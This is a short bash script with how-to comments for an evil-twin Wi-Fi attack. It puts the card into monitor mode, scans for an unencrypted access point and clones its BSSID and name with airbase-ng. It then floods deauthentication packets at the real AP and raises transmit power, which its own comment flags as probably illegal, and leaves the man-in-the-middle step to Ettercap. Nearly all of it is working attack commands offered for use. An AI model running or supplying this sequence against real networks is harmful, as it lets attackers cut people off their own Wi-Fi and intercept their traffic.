#!/bin/bash

# Issues exist with how bash executes certain commands, so it is best to run the commands
#   yourself within your terminal. The comments should provide all information necessary


# Kill any process that may interfere
airmon-ng check kill

# Make sure wireless card is in capture mode
airmon-ng start wlan0

# Find all access points nearby
timeout 10 airodump-ng wlan0mon &> output.txt

# Look through output.txt file for a non-encrypted AP
# Get the BSSID and ESSID and use them to run the command below
airbase-ng -a $BSSID --essid "$ESSID" -c 11 wlan0mon &

# Now you have a fake wifi access poiint with the same name as the unsecure one
# Next step is to bump the victim off his AP
aireplay-ng --deauth 0 -a $BSSID

# Turn up the power on our AP to ensure it is stronger than the original router
# WARNING: this part is probably illegal in your country
iwconfig wlan0 txpower 30

#From here use Ettercap to complete a MitM attack
